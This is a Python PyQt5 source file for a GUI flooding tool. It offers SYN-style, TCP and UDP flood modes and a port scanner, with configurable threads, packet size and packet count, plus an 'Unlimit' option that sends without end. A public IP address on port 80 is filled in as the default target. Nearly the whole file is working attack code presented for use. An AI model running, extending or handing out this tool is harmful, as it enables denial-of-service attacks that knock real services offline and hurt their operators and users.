# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'inter.ui'
#
# Created by: PyQt5 UI code generator 5.15.6
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.

import threading
import sys
import time
import random
import socket
import argparse
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import QThread
import signal


#signal.signal(signal.SIGFPE,signal.SIG_DFL)
class SynFlood(QThread):
    def __init__(self,mainwindow,parent = None):
        super().__init__()
        self.mainwindow = mainwindow
        self.is_run  = True


    def attack(self):
        for j in range(self.packet):
            if self.is_run ==True:
                try:
                    self.synflood = socket.socket()
                    self.synflood.bind((self.mainwindow.src_label.text(),random.randint(10000,65000)))
                    self.synflood.connect((self.ip, self.port))
                except Exception as msg:
                    #print(msg)
                    pass
            else:
                break
    def stop(self):
        self.is_run=False     
    def run(self):
        self.ip = socket.gethostbyname(self.mainwindow.ip_label.text())
        self.port = int(self.mainwindow.port_label.text())
        if self.mainwindow.checkBox.isChecked()==False:
            self.packet = int(self.mainwindow.packet_label.text())
        else:
            self.packet = sys.maxsize
        self.threads = int(self.mainwindow.threads_label.text())

        for i in range(self.threads):
            if self.is_run == True:
                try:
                    syn = threading.Thread(target = self.attack)
                    syn.start() 
                except KeyboardInterrupt:
                    print ("Flood has stopped")
                    sys.exit()
                except socket.error:
                    print ("Socket couldn't connect")
                    pass
                except Exception as msg:
                    print("Beda sluchilas")
                    pass
                #time.sleep(0.1)
                print("Potoc nomer "+str(i)+" zavershen")

class TcpFlood(QThread):
    def __init__(self,mainwindow,parent = None):
        super().__init__()
        self.mainwindow = mainwindow
        self.is_run  = True
    def attack(self):
        #while True:
        for j in range(self.packet):
            if self.is_run ==True:
                try:
                    bytes = random._urandom(self.size)
                    self.tcpflood = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    self.tcpflood.bind((self.mainwindow.src_label.text(),random.randint(10000,65000)))
                    self.tcpflood.connect((self.ip, self.port))
                    self.tcpflood.setblocking(0)
                    self.tcpflood.sendto(bytes,(self.ip,self.port))
                except Exception as msg:
                    #print(msg)
                    pass
            else:
                break
    def stop(self):
        self.is_run=False 
    def run(self):
        self.ip = socket.gethostbyname(self.mainwindow.ip_label.text())
        self.port = int(self.mainwindow.port_label.text())
        if self.mainwindow.checkBox.isChecked()==False:
            self.packet = int(self.mainwindow.packet_label.text())
        else:
            self.packet = sys.maxsize
        self.threads = int(self.mainwindow.threads_label.text())
        self.size = int(self.mainwindow.size_label.text())
        for i in range(self.threads):
            if self.is_run == True:
                try:
                    tcp = threading.Thread(target = self.attack)
                    tcp.start() 
                except KeyboardInterrupt:
                    print ("Flood has stopped")
                    sys.exit()
                except socket.error:
                    print ("Socket couldn't connect")
                    pass
                except Exception:
                    print("Beda sluchilas")
                    pass

class UdpFlood(QThread):
    def __init__(self, mainwindow,parent = None):
        super().__init__()
        self.mainwindow = mainwindow
        self.is_run= True
    def attack(self):
        #while True:
        for j in range(self.packet):
            if self.is_run == True:
                try:
                    bytes = random._urandom(self.size)
                    self.tcpflood = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                    self.tcpflood.sendto(bytes,(self.ip,self.port))
                except Exception as msg:
                    #print(msg)
                    pass
            else:
                break
    def stop(self):
        self.is_run=False 
    def run(self):
        self.ip = socket.gethostbyname(self.mainwindow.ip_label.text())
        self.port = int(self.mainwindow.port_label.text())
        if self.mainwindow.checkBox.isChecked()==False:
            self.packet = int(self.mainwindow.packet_label.text())
        else:
            self.packet = sys.maxsize
        self.threads = int(self.mainwindow.threads_label.text())
        self.size = int(self.mainwindow.size_label.text())
        for i in range(self.threads):
            if self.is_run == True:
                try:
                    udp = threading.Thread(target = self.attack)
                    udp.start() 
                except KeyboardInterrupt:
                    print ("Flood has stopped")
                    sys.exit()
                except socket.error:
                    print ("Socket couldn't connect")
                    pass
                except Exception:
                    print("Beda sluchilas")
                    pass

class PortScan(QThread):
    def __init__(self,mainwindow, parent = None):
        super().__init__()
        self.mainwindow = mainwindow
        self.is_run = True
        self.arr =[]
    def stop(self):
        self.is_run=False
    def run(self):

        self.ip = socket.gethostbyname(self.mainwindow.ip_label.text())
        for i in range(1,5000):
            try:
                if self.is_run==True:
                    port_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    print("Port: ",i," is scanning")
                    port_sock.connect((self.ip,i))
                    print("Port:",i,"is open")
                    port_sock.close()
                else:
                    break
            except Exception as msg:
                print(msg)
                print("Port: ",i," closed")
                pass

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(463, 427)
        MainWindow.setToolTip("")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.ip_label = QtWidgets.QLineEdit(self.centralwidget)
        self.ip_label.setGeometry(QtCore.QRect(110, 10, 91, 21))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.ip_label.setFont(font)
        self.ip_label.setToolTip("")
        self.ip_label.setStatusTip("")
        self.ip_label.setWhatsThis("")
        self.ip_label.setAccessibleName("")
        self.ip_label.setAccessibleDescription("")
        self.ip_label.setInputMask("")
        self.ip_label.setObjectName("ip")
        
        self.src_label = QtWidgets.QLineEdit(self.centralwidget)
        self.src_label.setGeometry(QtCore.QRect(110, 40, 91, 21))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.src_label.setFont(font)
        self.src_label.setToolTip("")
        self.src_label.setStatusTip("")
        self.src_label.setWhatsThis("")
        self.src_label.setAccessibleName("")
        self.src_label.setAccessibleDescription("")
        self.src_label.setInputMask("")
        self.src_label.setObjectName("src")

        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(15, 12, 61, 21))
        font = QtGui.QFont()
        font.setFamily("Myanmar Text")
        font.setPointSize(12)
        font.setBold(True)
        font.setWeight(75)
        self.label.setFont(font)
        self.label.setObjectName("label")

        self.label_src = QtWidgets.QLabel(self.centralwidget)
        self.label_src.setGeometry(QtCore.QRect(15, 42, 61, 21))
        font = QtGui.QFont()
        font.setFamily("Myanmar Text")
        font.setPointSize(12)
        font.setBold(True)
        font.setWeight(75)
        self.label_src.setFont(font)
        self.label_src.setObjectName("label")
        
        self.threads_label = QtWidgets.QLineEdit(self.centralwidget)
        self.threads_label.setGeometry(QtCore.QRect(310, 18, 51, 20))
        self.threads_label.setObjectName("threads")
        self.packet_label = QtWidgets.QLineEdit(self.centralwidget)
        self.packet_label.setGeometry(QtCore.QRect(310, 50, 51, 20))
        self.packet_label.setObjectName("packets")
        self.size_label = QtWidgets.QLineEdit(self.centralwidget)
        self.size_label.setGeometry(QtCore.QRect(310, 80, 51, 20))
        self.size_label.setObjectName("size")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(250, 23, 50, 13))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(250, 53, 47, 13))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")
        self.label_4 = QtWidgets.QLabel(self.centralwidget)
        self.label_4.setGeometry(QtCore.QRect(250, 83, 47, 13))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.label_4.setFont(font)
        self.label_4.setObjectName("label_4")
        self.comboBox = QtWidgets.QComboBox(self.centralwidget)
        self.comboBox.setGeometry(QtCore.QRect(110, 70, 91, 22))
        self.comboBox.setEditable(False)
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem("SynFlood")
        self.comboBox.addItem("TcpFlood")
        self.comboBox.addItem("UdpFlood")
        self.comboBox.addItem("PortScan")
        self.port_label = QtWidgets.QLineEdit(self.centralwidget)
        self.port_label.setGeometry(QtCore.QRect(310, 110, 51, 20))
        self.port_label.setObjectName("Port")
        self.label_5 = QtWidgets.QLabel(self.centralwidget)
        self.label_5.setGeometry(QtCore.QRect(250, 113, 47, 13))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.label_5.setFont(font)
        self.label_5.setObjectName("label_5")
        self.BtnStart = QtWidgets.QPushButton(self.centralwidget)
        self.BtnStart.setGeometry(QtCore.QRect(15, 100, 91, 31))
        self.BtnStart.setObjectName("BtnStart")
        #self.textBrowser = QtWidgets.QTextBrowser(self.centralwidget)
        #self.textBrowser.setGeometry(QtCore.QRect(15, 150, 431, 192))
        #self.textBrowser.setObjectName("textBrowser")
        self.textEdit = QtWidgets.QTextEdit(self.centralwidget)
        self.textEdit.setGeometry(QtCore.QRect(15, 150, 431, 192))
        self.textEdit.setObjectName("textEdit")
        self.checkBox = QtWidgets.QCheckBox(self.centralwidget)
        self.checkBox.setGeometry(QtCore.QRect(370, 50, 70, 20))
        self.checkBox.setObjectName("checkBox")
        self.BtnStop = QtWidgets.QPushButton(self.centralwidget)
        self.BtnStop.setGeometry(QtCore.QRect(110, 100, 91, 31))
        self.BtnStop.setObjectName("BtnStop")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 463, 21))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

        self.SynFloodThread_instance = SynFlood(mainwindow=self)
        self.TcpFloodThread_instance = TcpFlood(mainwindow=self)
        self.UdpFloodThread_instance = TcpFlood(mainwindow=self)
        self.PortScanThread_instance = PortScan(mainwindow=self)

        self.ip = socket.gethostbyname(self.ip_label.text())
        self.port = int(self.port_label.text())
        self.size = int(self.size_label.text())
        self.threads = int(self.threads_label.text())
        self.packet = int(self.packet_label.text())
        self.stop_flag= False
        self.BtnStart.clicked.connect(self.dos)
        self.BtnStart.clicked.connect(self.text_start)
        self.BtnStop.clicked.connect(lambda: self.SynFloodThread_instance.stop())
        self.BtnStop.clicked.connect(lambda: self.TcpFloodThread_instance.stop())
        self.BtnStop.clicked.connect(lambda: self.UdpFloodThread_instance.stop())
        self.BtnStop.clicked.connect(lambda: self.PortScanThread_instance.stop())
        self.BtnStop.clicked.connect(self.text_stop)
    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.ip_label.setText(_translate("MainWindow", "69.162.108.171"))
        self.src_label.setText(_translate("MainWindow", "192.168.0.184"))
        self.label.setText(_translate("MainWindow", "Target"))
        self.label_src.setText(_translate("MainWindow", "Source"))
        self.threads_label.setText(_translate("MainWindow", "150"))
        self.packet_label.setText(_translate("MainWindow", "100"))
        self.size_label.setText(_translate("MainWindow", "2048"))
        self.label_2.setText(_translate("MainWindow", "Threads"))
        self.label_3.setText(_translate("MainWindow", "Packets"))
        self.label_4.setText(_translate("MainWindow", "Size"))
        self.port_label.setText(_translate("MainWindow", "80"))
        self.label_5.setText(_translate("MainWindow", "Port"))
        self.BtnStart.setText(_translate("MainWindow", "Start"))
        self.checkBox.setText(_translate("MainWindow", "Unlimit"))
        self.BtnStop.setText(_translate("MainWindow", "Stop"))
    
    def text_start(self):
        
        self.textEdit.append("Process is going")
    def text_stop(self):
        self.textEdit.append("Process is stopped") 

    def dos(self):
        if self.comboBox.currentText() == "SynFlood":
            print(socket.gethostbyname(socket.gethostname()))
            self.SynFloodThread_instance.is_run= True
            self.SynFloodThread_instance.start()
        if self.comboBox.currentText() == "TcpFlood":
            self.TcpFloodThread_instance.is_run= True
            self.TcpFloodThread_instance.start()
        if self.comboBox.currentText() == "UdpFlood":
            self.UdpFloodThread_instance.is_run= True
            self.UdpFloodThread_instance.start()
        if self.comboBox.currentText() == "PortScan":
            self.PortScanThread_instance.is_run= True
            self.PortScanThread_instance.start()

            
if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
